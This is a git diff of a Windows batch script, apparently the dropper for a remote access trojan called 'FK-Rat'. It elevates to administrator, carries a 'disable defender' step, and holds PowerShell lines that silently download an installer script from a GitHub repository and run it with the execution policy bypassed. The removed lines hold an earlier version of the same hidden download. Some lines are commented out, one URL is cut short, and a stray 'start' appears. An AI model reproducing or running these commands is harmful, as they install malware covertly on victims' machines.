@@ -1,5 +1,6 @@
 REM get admin permissions for script
 @echo off
+
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> check for permissions
@@ -28,8 +29,9 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-REM disable defender
+REM diable defender
+start
 
-Rem  rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/sunnickel/FK-Rat/main/resou"
-start powershell 
+REM rat resources
+REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/Sunnickel/FK-RAT/blob/main/files/installer.ps1 -OutFile KFPGaEYdcz.ps1"; 
+REM powershell powershell.exe -windowstyle hidden -ep bypass ./KFPGaEYdcz.ps1
